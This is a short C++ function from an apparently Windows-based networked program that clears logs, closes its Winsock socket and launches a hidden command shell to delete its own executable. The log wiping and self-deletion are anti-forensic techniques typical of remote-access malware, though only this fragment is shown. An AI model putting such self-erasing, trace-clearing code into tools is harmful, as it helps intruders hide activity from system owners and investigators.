void DeleteSelf(string fileName)
{
    clearLogs();
    closesocket(objSocket);
    WSACleanup();

    fileName.erase(fileName.length() - 4);
    fileName += ".exe";

    string command = "start /min cmd /c del " + fileName;
    system(command.data());
}